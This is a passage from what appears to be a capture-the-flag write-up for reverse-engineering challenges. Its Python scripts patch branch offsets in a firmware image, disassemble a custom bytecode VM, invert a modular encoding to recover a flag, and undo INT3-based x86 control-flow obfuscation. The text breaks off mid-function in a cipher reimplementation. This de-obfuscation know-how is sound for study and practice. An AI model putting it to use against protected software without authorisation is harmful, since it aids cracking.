<span class="hljs-number">0x80001664</span>: <span class="hljs-number">0x800032e4</span>,
<span class="hljs-number">0x80001684</span>: <span class="hljs-number">0x800032f8</span>,
<span class="hljs-number">0x80001698</span>: <span class="hljs-number">0x8000330c</span>,
<span class="hljs-number">0x800016ac</span>: <span class="hljs-number">0x80003320</span>,
<span class="hljs-number">0x800016ec</span>: <span class="hljs-number">0x80003334</span>,
<span class="hljs-number">0x800016fc</span>: <span class="hljs-number">0x80003348</span>,
<span class="hljs-number">0x80001714</span>: <span class="hljs-number">0x8000335c</span>,
<span class="hljs-number">0x80001734</span>: <span class="hljs-number">0x80003370</span>,
<span class="hljs-number">0x80001744</span>: <span class="hljs-number">0x80003384</span>,
<span class="hljs-number">0x80001754</span>: <span class="hljs-number">0x80003398</span>,
<span class="hljs-number">0x80001768</span>: <span class="hljs-number">0x800033ac</span>,
<span class="hljs-number">0x8000177c</span>: <span class="hljs-number">0x800033c0</span>,
<span class="hljs-number">0x80001798</span>: <span class="hljs-number">0x800033d4</span>,
<span class="hljs-number">0x800017b0</span>: <span class="hljs-number">0x800033e8</span>,
<span class="hljs-number">0x800017d8</span>: <span class="hljs-number">0x800033fc</span>,
<span class="hljs-number">0x800017e4</span>: <span class="hljs-number">0x80003410</span>,
<span class="hljs-number">0x80001800</span>: <span class="hljs-number">0x80003424</span>,
<span class="hljs-number">0x80001814</span>: <span class="hljs-number">0x80003438</span>,
<span class="hljs-number">0x80001834</span>: <span class="hljs-number">0x8000344c</span>,
<span class="hljs-number">0x80001854</span>: <span class="hljs-number">0x80003460</span>,
<span class="hljs-number">0x80001860</span>: <span class="hljs-number">0x80003474</span>,
<span class="hljs-number">0x80001880</span>: <span class="hljs-number">0x80003488</span>,
<span class="hljs-number">0x8000188c</span>: <span class="hljs-number">0x8000349c</span>,
<span class="hljs-number">0x800018a8</span>: <span class="hljs-number">0x800034b0</span>,
<span class="hljs-number">0x800018c0</span>: <span class="hljs-number">0x800034c4</span>,
<span class="hljs-number">0x800018d4</span>: <span class="hljs-number">0x800034d8</span>,
<span class="hljs-number">0x800018e8</span>: <span class="hljs-number">0x800034ec</span>,
<span class="hljs-number">0x80001904</span>: <span class="hljs-number">0x80003500</span>,
<span class="hljs-number">0x80001920</span>: <span class="hljs-number">0x80003514</span>,
<span class="hljs-number">0x8000193c</span>: <span class="hljs-number">0x80003528</span>,
<span class="hljs-number">0x80001948</span>: <span class="hljs-number">0x8000353c</span>,
<span class="hljs-number">0x80001958</span>: <span class="hljs-number">0x80003550</span>,
<span class="hljs-number">0x80001968</span>: <span class="hljs-number">0x80003564</span>,
<span class="hljs-number">0x80001978</span>: <span class="hljs-number">0x80003578</span>,
<span class="hljs-number">0x80001990</span>: <span class="hljs-number">0x8000358c</span>,
<span class="hljs-number">0x8000199c</span>: <span class="hljs-number">0x800035a0</span>,
<span class="hljs-number">0x800019b4</span>: <span class="hljs-number">0x800035b4</span>,
<span class="hljs-number">0x800019dc</span>: <span class="hljs-number">0x800035c8</span>,
<span class="hljs-number">0x800019ec</span>: <span class="hljs-number">0x800035dc</span>,
<span class="hljs-number">0x80001a08</span>: <span class="hljs-number">0x800035f0</span>,
<span class="hljs-number">0x80001a14</span>: <span class="hljs-number">0x80003604</span>,
<span class="hljs-number">0x80001a2c</span>: <span class="hljs-number">0x80003618</span>,
<span class="hljs-number">0x80001a48</span>: <span class="hljs-number">0x8000362c</span>,
<span class="hljs-number">0x80001a54</span>: <span class="hljs-number">0x80003640</span>,
<span class="hljs-number">0x80001a6c</span>: <span class="hljs-number">0x80003654</span>,
<span class="hljs-number">0x80001a88</span>: <span class="hljs-number">0x80003668</span>,
<span class="hljs-number">0x80001aa0</span>: <span class="hljs-number">0x8000367c</span>,
<span class="hljs-number">0x80001ae0</span>: <span class="hljs-number">0x80003690</span>,
<span class="hljs-number">0x80001af8</span>: <span class="hljs-number">0x800036a4</span>,
<span class="hljs-number">0x80001b10</span>: <span class="hljs-number">0x800036b8</span>,
<span class="hljs-number">0x80001b3c</span>: <span class="hljs-number">0x800036cc</span>,
<span class="hljs-number">0x80001b54</span>: <span class="hljs-number">0x800036e0</span>,
<span class="hljs-number">0x80001b98</span>: <span class="hljs-number">0x800036f4</span>,
<span class="hljs-number">0x80001ba4</span>: <span class="hljs-number">0x80003708</span>,
<span class="hljs-number">0x80001bbc</span>: <span class="hljs-number">0x8000371c</span>,
<span class="hljs-number">0x80001bc8</span>: <span class="hljs-number">0x80003730</span>,
<span class="hljs-number">0x80001be0</span>: <span class="hljs-number">0x80003744</span>,
<span class="hljs-number">0x80001bf8</span>: <span class="hljs-number">0x80003758</span>,
<span class="hljs-number">0x80001c20</span>: <span class="hljs-number">0x8000376c</span>,
<span class="hljs-number">0x80001c30</span>: <span class="hljs-number">0x80003780</span>,
<span class="hljs-number">0x80001c58</span>: <span class="hljs-number">0x80003794</span>,
<span class="hljs-number">0x80001c98</span>: <span class="hljs-number">0x800037a8</span>,
<span class="hljs-number">0x80001cb8</span>: <span class="hljs-number">0x800037bc</span>,
<span class="hljs-number">0x80001cf8</span>: <span class="hljs-number">0x800037d0</span>,
<span class="hljs-number">0x80001d1c</span>: <span class="hljs-number">0x800037e4</span>,
<span class="hljs-number">0x80001d3c</span>: <span class="hljs-number">0x800037f8</span>,
<span class="hljs-number">0x80001d5c</span>: <span class="hljs-number">0x8000380c</span>,
<span class="hljs-number">0x80001d70</span>: <span class="hljs-number">0x80003820</span>,
<span class="hljs-number">0x80001d80</span>: <span class="hljs-number">0x80003834</span>,
<span class="hljs-number">0x80001da0</span>: <span class="hljs-number">0x80003848</span>,
<span class="hljs-number">0x80001dcc</span>: <span class="hljs-number">0x8000385c</span>,
<span class="hljs-number">0x80001dd8</span>: <span class="hljs-number">0x80003870</span>,
<span class="hljs-number">0x80001e04</span>: <span class="hljs-number">0x80003884</span>,
<span class="hljs-number">0x80001e1c</span>: <span class="hljs-number">0x80003898</span>,
<span class="hljs-number">0x80001e28</span>: <span class="hljs-number">0x800038ac</span>,
<span class="hljs-number">0x80001e54</span>: <span class="hljs-number">0x800038c0</span>,
<span class="hljs-number">0x80001e9c</span>: <span class="hljs-number">0x800038d4</span>,
<span class="hljs-number">0x80001eb8</span>: <span class="hljs-number">0x800038e8</span>,
<span class="hljs-number">0x80001ed8</span>: <span class="hljs-number">0x800038fc</span>,
<span class="hljs-number">0x80001f0c</span>: <span class="hljs-number">0x80003910</span>,
<span class="hljs-number">0x80001f20</span>: <span class="hljs-number">0x80003924</span>,
<span class="hljs-number">0x80001f50</span>: <span class="hljs-number">0x80003938</span>,
<span class="hljs-number">0x80001f74</span>: <span class="hljs-number">0x8000394c</span>,
<span class="hljs-number">0x80001f94</span>: <span class="hljs-number">0x80003960</span>,
<span class="hljs-number">0x80001fb8</span>: <span class="hljs-number">0x80003974</span>,
<span class="hljs-number">0x80001fe0</span>: <span class="hljs-number">0x80003988</span>,
<span class="hljs-number">0x80002008</span>: <span class="hljs-number">0x8000399c</span>,
<span class="hljs-number">0x8000201c</span>: <span class="hljs-number">0x800039b0</span>,
<span class="hljs-number">0x80002040</span>: <span class="hljs-number">0x800039c4</span>,
<span class="hljs-number">0x80002078</span>: <span class="hljs-number">0x800039d8</span>,
<span class="hljs-number">0x800020bc</span>: <span class="hljs-number">0x800039ec</span>,
<span class="hljs-number">0x800020d8</span>: <span class="hljs-number">0x80003a00</span>,
<span class="hljs-number">0x80002108</span>: <span class="hljs-number">0x80003a14</span>,
<span class="hljs-number">0x80002144</span>: <span class="hljs-number">0x80003a28</span>,
<span class="hljs-number">0x80002160</span>: <span class="hljs-number">0x80003a3c</span>,
<span class="hljs-number">0x80002194</span>: <span class="hljs-number">0x80003a50</span>,
<span class="hljs-number">0x800021b0</span>: <span class="hljs-number">0x80003a64</span>,
<span class="hljs-number">0x800021d4</span>: <span class="hljs-number">0x80003a78</span>,
<span class="hljs-number">0x80002214</span>: <span class="hljs-number">0x80003a8c</span>,
<span class="hljs-number">0x80002228</span>: <span class="hljs-number">0x80003aa0</span>,
<span class="hljs-number">0x80002238</span>: <span class="hljs-number">0x80003ab4</span>,
<span class="hljs-number">0x80002248</span>: <span class="hljs-number">0x80003ac8</span>,
<span class="hljs-number">0x80002258</span>: <span class="hljs-number">0x80003adc</span>,
<span class="hljs-number">0x80002288</span>: <span class="hljs-number">0x80003af0</span>,
<span class="hljs-number">0x800022bc</span>: <span class="hljs-number">0x80003b04</span>,
<span class="hljs-number">0x800022e0</span>: <span class="hljs-number">0x80003b18</span>,
<span class="hljs-number">0x80002334</span>: <span class="hljs-number">0x80003b2c</span>,
<span class="hljs-number">0x80002354</span>: <span class="hljs-number">0x80003b40</span>,
<span class="hljs-number">0x8000237c</span>: <span class="hljs-number">0x80003b54</span>,
<span class="hljs-number">0x8000238c</span>: <span class="hljs-number">0x80003b68</span>,
<span class="hljs-number">0x800023a0</span>: <span class="hljs-number">0x80003b7c</span>,
<span class="hljs-number">0x800023b4</span>: <span class="hljs-number">0x80003b90</span>,
<span class="hljs-number">0x800023d8</span>: <span class="hljs-number">0x80003ba4</span>,
<span class="hljs-number">0x800023ec</span>: <span class="hljs-number">0x80003bb8</span>,
<span class="hljs-number">0x80002400</span>: <span class="hljs-number">0x80003bcc</span>,
<span class="hljs-number">0x80002424</span>: <span class="hljs-number">0x80003be0</span>,
<span class="hljs-number">0x80002438</span>: <span class="hljs-number">0x80003bf4</span>,
<span class="hljs-number">0x8000244c</span>: <span class="hljs-number">0x80003c08</span>,
<span class="hljs-number">0x80002470</span>: <span class="hljs-number">0x80003c1c</span>,
<span class="hljs-number">0x80002480</span>: <span class="hljs-number">0x80003c30</span>,
<span class="hljs-number">0x8000249c</span>: <span class="hljs-number">0x80003c44</span>,
<span class="hljs-number">0x800024cc</span>: <span class="hljs-number">0x80003c58</span>,
<span class="hljs-number">0x800024dc</span>: <span class="hljs-number">0x80003c6c</span>,
<span class="hljs-number">0x80002500</span>: <span class="hljs-number">0x80003c80</span>,
<span class="hljs-number">0x80002534</span>: <span class="hljs-number">0x80003c94</span>,
<span class="hljs-number">0x80002540</span>: <span class="hljs-number">0x80003ca8</span>,
<span class="hljs-number">0x80002574</span>: <span class="hljs-number">0x80003cbc</span>,
<span class="hljs-number">0x80002580</span>: <span class="hljs-number">0x80003cd0</span>,
<span class="hljs-number">0x80002590</span>: <span class="hljs-number">0x80003ce4</span>,
<span class="hljs-number">0x800025e0</span>: <span class="hljs-number">0x80003cf8</span>,
<span class="hljs-number">0x80002600</span>: <span class="hljs-number">0x80003d0c</span>,
}

p = <span class="hljs-number">0x10000</span>
while True:
    q = buf<span class="hljs-number">.</span>find(bytes<span class="hljs-number">.</span>fromhex(<span class="hljs-string">&#x27;408048001000FFFF&#x27;</span>), p)
    if q == -<span class="hljs-number">1</span>:
        break

    q += <span class="hljs-number">4</span>
    fr = q - <span class="hljs-number">0x10000</span> + <span class="hljs-number">0x80000000</span>
    assert fr <span class="hljs-keyword">in</span> tbl
    to = tbl[fr]

    off = (to - (fr + <span class="hljs-number">4</span>)) // <span class="hljs-number">4</span>

    patch = pack(<span class="hljs-string">&#x27;&gt;H&#x27;</span>, off)

    # buf[q + <span class="hljs-number">2</span>:q + <span class="hljs-number">4</span>] = patch
    buf = buf[:q + <span class="hljs-number">2</span>] + patch + buf[q + <span class="hljs-number">4</span>:]

    assert off &lt; <span class="hljs-number">0x10000</span>

open(<span class="hljs-string">&#x27;flashp&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(buf)
    </code></pre><pre class="hljs"><code>
code = bytearray.fromhex(&#x27;<span class="hljs-number">000909</span>1D<span class="hljs-number">0009000000</span>0A<span class="hljs-number">00050006001400</span><span class="hljs-number">09000100</span>0A<span class="hljs-number">000100</span>0B<span class="hljs-number">00080009000100</span>06FFE<span class="hljs-number">00009001100020</span>009B<span class="hljs-number">248000300097</span>2A<span class="hljs-number">90005000701440</span><span class="hljs-number">00900110002000</span>9B<span class="hljs-number">24800030009097</span>E<span class="hljs-number">0005000701</span>2E<span class="hljs-number">00090011000200</span>09B<span class="hljs-number">24800030009556</span><span class="hljs-number">00005000701180</span><span class="hljs-number">00900110002000</span>9B<span class="hljs-number">248000300094</span>CA<span class="hljs-number">10005000701020</span><span class="hljs-number">00900110002000</span>9B<span class="hljs-number">24800030009003</span><span class="hljs-number">7000500070</span>0EC<span class="hljs-number">00090011000200</span>09B<span class="hljs-number">2480003000</span>9AA<span class="hljs-number">710005000700</span>D<span class="hljs-number">60009001100020</span>009B<span class="hljs-number">24800030009122</span>C<span class="hljs-number">0005000700</span>C<span class="hljs-number">00009001100020</span>009B<span class="hljs-number">24800030009453</span><span class="hljs-number">6000500070</span>0AA<span class="hljs-number">00090011000200</span>09B<span class="hljs-number">248000300091</span>1E<span class="hljs-number">80005000700940</span><span class="hljs-number">00900110002000</span>9B<span class="hljs-number">24800030009124</span><span class="hljs-number">700050007007</span>E<span class="hljs-number">00090011000200</span>09B<span class="hljs-number">248000300097</span>6C<span class="hljs-number">70005000700680</span><span class="hljs-number">00900110002000</span>9B<span class="hljs-number">24800030009096</span>D<span class="hljs-number">00050007005200</span><span class="hljs-number">09001100020009</span>B<span class="hljs-number">24800030009122</span>C<span class="hljs-number">0005000700</span>3C<span class="hljs-number">00090011000200</span>09B<span class="hljs-number">248000300098</span>7CB<span class="hljs-number">00050007002600</span><span class="hljs-number">09001100020009</span>B<span class="hljs-number">248000300090</span>9E<span class="hljs-number">40005000700100</span><span class="hljs-number">009091</span>D<span class="hljs-number">00070008000900</span><span class="hljs-number">0000</span>0B000D<span class="hljs-number">0009000100</span>0B000D&#x27;)

simple = [&#x27;add&#x27;, &#x27;sub&#x27;, &#x27;mul&#x27;, &#x27;mod&#x27;, &#x27;lt&#x27;, &#x27;eq&#x27;]
pc = <span class="hljs-number">0</span>

def gw():
    global pc
    v = (code[pc] &lt;&lt; <span class="hljs-number">8</span>) <span class="hljs-string">| (code[pc + 1])</span>
    pc += <span class="hljs-number">2</span>
    return v

while pc &lt; len(code):
    pc0 = pc
    op = gw()
    ops = &#x27;&#x27;
    if op &lt; len(simple):
        mn = simple[op]
    elif op in [<span class="hljs-number">6</span>, <span class="hljs-number">7</span>]:
        mn = {<span class="hljs-number">6</span>:&#x27;jx&#x27;, <span class="hljs-number">7</span>:&#x27;jnx&#x27;}[op]
        opr = gw()
        dst = (pc + opr) % <span class="hljs-number">0</span>x10000
        ops = &#x27;{:04x}&#x27;.format(dst)
        assert pc % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> and opr % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>
        
    elif op == <span class="hljs-number">8</span>:
        mn = &#x27;flag&#x27;
    elif op == <span class="hljs-number">9</span>:
        opr = gw()
        mn = &#x27;imm&#x27;
        ops = &#x27;{:04x}&#x27;.format(opr)
    elif op == <span class="hljs-number">10</span>:
        mn = &#x27;gln&#x27;
    elif op == <span class="hljs-number">11</span>:
        mn = &#x27;sln&#x27;
    elif op == <span class="hljs-number">12</span>:
        mn = &#x27;drop&#x27;
    elif op == <span class="hljs-number">13</span>:
        mn = &#x27;hlt&#x27;

    print(f&#x27;{pc0:04x}     {mn:&lt;5s}   {ops}&#x27;.rstrip())</code></pre><pre class="hljs"><code>from Crypto<span class="hljs-number">.</span>Util<span class="hljs-number">.</span>number import inverse

d = inverse(<span class="hljs-number">0x11</span>, <span class="hljs-number">0xb248</span>)

def f(a):
    return (a * d % <span class="hljs-number">0xb248</span>)

arr = [
<span class="hljs-number">0x72a9</span>,
<span class="hljs-number">0x097e</span>,
<span class="hljs-number">0x5560</span>,
<span class="hljs-number">0x4ca1</span>,
<span class="hljs-number">0x0037</span>,
<span class="hljs-number">0xaa71</span>,
<span class="hljs-number">0x122c</span>,
<span class="hljs-number">0x4536</span>,
<span class="hljs-number">0x11e8</span>,
<span class="hljs-number">0x1247</span>,
<span class="hljs-number">0x76c7</span>,
<span class="hljs-number">0x096d</span>,
<span class="hljs-number">0x122c</span>,
<span class="hljs-number">0x87cb</span>,
<span class="hljs-number">0x09e4</span>,
]

from struct import pack
s = b<span class="hljs-string">&#x27;&#x27;
for c in arr:
    s += pack(&quot;&lt;H&quot;, f(c))
print(s[::-1])

</span></code></pre><h3 id="j"><a class="header-link" href="#j"></a>j</h3>
<pre class="hljs"><code>
from capstone import *
from capstone<span class="hljs-number">.</span>x86_const import *
control = [<span class="hljs-number">0x43200CC0</span>, <span class="hljs-number">0x856A19E4</span>, <span class="hljs-number">0x048A1FA1</span>, <span class="hljs-number">0x05002064</span>, <span class="hljs-number">0x04D82290</span>, <span class="hljs-number">0x04002432</span>, <span class="hljs-number">0x046024B3</span>, <span class="hljs-number">0x8D402534</span>, <span class="hljs-number">0x048A2771</span>, <span class="hljs-number">0x04002790</span>, <span class="hljs-number">0x8D402864</span>, <span class="hljs-number">0x83482AF3</span>, <span class="hljs-number">0x8D842BA4</span>, <span class="hljs-number">0x07E83761</span>, <span class="hljs-number">0x885C37D4</span>, <span class="hljs-number">0x083A3D60</span>, <span class="hljs-number">0x06F03F22</span>, <span class="hljs-number">0x07C03F93</span>, <span class="hljs-number">0x8D604004</span>, <span class="hljs-number">0x07E84271</span>, <span class="hljs-number">0x46F04290</span>, <span class="hljs-number">0x8D604334</span>, <span class="hljs-number">0x09E84A41</span>, <span class="hljs-number">0x0A544AB4</span>, <span class="hljs-number">0x0A324D50</span>, <span class="hljs-number">0x094C4F22</span>, <span class="hljs-number">0x09C04F93</span>, <span class="hljs-number">0x8D805004</span>, <span class="hljs-number">0x09E85231</span>, <span class="hljs-number">0x494C5250</span>, <span class="hljs-number">0x8D8052F4</span>, <span class="hljs-number">0x0C8A5FB1</span>, <span class="hljs-number">0x0CEE6034</span>, <span class="hljs-number">0x0CD06260</span>, <span class="hljs-number">0x0BFA6432</span>, <span class="hljs-number">0x0C6064B3</span>, <span class="hljs-number">0x0D206534</span>, <span class="hljs-number">0x0C8A6731</span>, <span class="hljs-number">0x0BFA6750</span>, <span class="hljs-number">0x81A267D3</span>, <span class="hljs-number">0x0D206900</span>, <span class="hljs-number">0x0D406A00</span>, <span class="hljs-number">0x0D606B00</span>, <span class="hljs-number">0x0D806C00</span>, <span class="hljs-number">0x0E606C74</span>, <span class="hljs-number">0x8F6A71B1</span>, <span class="hljs-number">0x0E987210</span>, <span class="hljs-number">0x0E607300</span>, <span class="hljs-number">0x0F6A74A1</span>, <span class="hljs-number">0x0F9C7524</span>, <span class="hljs-number">0x0E7E79D0</span>, <span class="hljs-number">0x0E987B32</span>, <span class="hljs-number">0x0F407BB3</span>, <span class="hljs-number">0x8E647C33</span>, <span class="hljs-number">0x52007C90</span>, <span class="hljs-number">0x92007D44</span>, <span class="hljs-number">0x12009000</span>]

dic = {}
for i <span class="hljs-keyword">in</span> control:
    jcc = i &amp; <span class="hljs-number">0xF</span>
    off = (i &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0x1FFF</span>
    ln  = i &gt;&gt; <span class="hljs-number">30</span>
    dst = (i &gt;&gt; <span class="hljs-number">17</span>) &amp; <span class="hljs-number">0x1FFF</span>

    dic[off] = (jcc, ln, dst)

buf = open(<span class="hljs-string">&#x27;code2&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()

<span class="hljs-built_in">cs</span> = <span class="hljs-built_in">Cs</span>(CS_ARCH_X86, CS_MODE_64)
<span class="hljs-built_in">cs</span><span class="hljs-number">.</span>detail = True

g = <span class="hljs-built_in">cs</span><span class="hljs-number">.</span>disasm(buf, <span class="hljs-number">0</span>)

xxx = []
dis = <span class="hljs-string">&#x27;&#x27;
while True:
    try:
        insn = next(g)
    except StopIteration:
        break
    pc = insn.address
    dis += f&#x27;</span>loc_{pc:08x}:\n<span class="hljs-string">&#x27;
    if insn.id == X86_INS_INT3:
        jcc, ln, dst = dic[pc]
        t = {0:&#x27;</span><span class="hljs-keyword">jmp</span><span class="hljs-string">&#x27;, 1:&#x27;</span><span class="hljs-keyword">jle</span><span class="hljs-string">&#x27;, 2:&#x27;</span><span class="hljs-keyword">jg</span><span class="hljs-string">&#x27;, 3:&#x27;</span><span class="hljs-keyword">jz</span><span class="hljs-string">&#x27;, 4:&#x27;</span><span class="hljs-keyword">jnz</span><span class="hljs-string">&#x27;}[jcc]
        l = {0:2, 1:5, 2:6}[ln]
        n = pc + l
        dis += f&#x27;</span>{t:&lt;10s} loc_{dst:08x}\n<span class="hljs-string">&#x27;
        g = cs.disasm(buf[n:], n)
    else:
        dis += f&#x27;</span>{insn<span class="hljs-number">.</span>mnemonic:&lt;10s} {insn<span class="hljs-number">.</span>op_str}\n<span class="hljs-string">&#x27;

dis += f&#x27;</span>loc_{<span class="hljs-number">0x900</span>:08x}:\n<span class="hljs-string">&#x27;

for i in xxx:
    assert i in dis
    print(i)
open(&#x27;</span>dis<span class="hljs-number">.</span>asm<span class="hljs-string">&#x27;, &#x27;</span>w<span class="hljs-string">&#x27;).write(dis)

from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)

code, ln = ks.asm(dis, 0)
code = bytearray(code)
open(&#x27;</span>code2r<span class="hljs-string">&#x27;, &#x27;</span>wb<span class="hljs-string">&#x27;).write(code)</span></code></pre><pre class="hljs"><code>
def <span class="hljs-keyword">bswap</span>(a):
    hi = a &gt;&gt; <span class="hljs-number">8</span>
    lo = a &amp; <span class="hljs-number">0xFF</span>
    return (lo &lt;&lt; <span class="hljs-number">8</span>) | hi

def <span class="hljs-built_in">word</span>(buf, i):
    return (buf[i] &lt;&lt; <span class="hljs-number">8</span>) | buf[i + <span class="hljs-number">1</span>]

def <span class="hljs-keyword">sub</span>(a, b):
    return (a + <span class="hljs-number">0x10000</span> - b) &amp; <span class="hljs-number">0xFFFF</span>

def <span class="hljs-keyword">add</span>(a, b):
    return (a + b) &amp; <span class="hljs-number">0xFFFF</span>

key = [
<span class="hljs-number">0x43</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x30</span>,
<span class="hljs-number">0xBE</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x86</span>,
<span class="hljs-number">0x05</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x7D</span>,
<span class="hljs-number">0xF9</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x0A</span>,
<span class="hljs-number">0x23</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xF3</span>,
<span class="hljs-number">0x88</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x46</span>,
<span class="hljs-number">0x97</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x28</span>,
<span class="hljs-number">0x06</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x6A</span>,
<span class="hljs-number">0xAC</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xFC</span>,
<span class="hljs-number">0x9E</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x12</span>,
<span class="hljs-number">0x19</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x31</span>,
<span class="hljs-number">0x11</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x73</span>,
<span class="hljs-number">0xA1</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x04</span>
]
k = [(key[i + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>) | key[i] for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, len(key), <span class="hljs-number">2</span>)]
p = [<span class="hljs-number">0</span> for i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>)]

def f1(a, b):
    t = a * b
    hi = (t &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span>
    lo = t &amp; <span class="hljs-number">0xFFFF</span>
    o = (lo &lt;&lt; <span class="hljs-number">16</span>) | hi
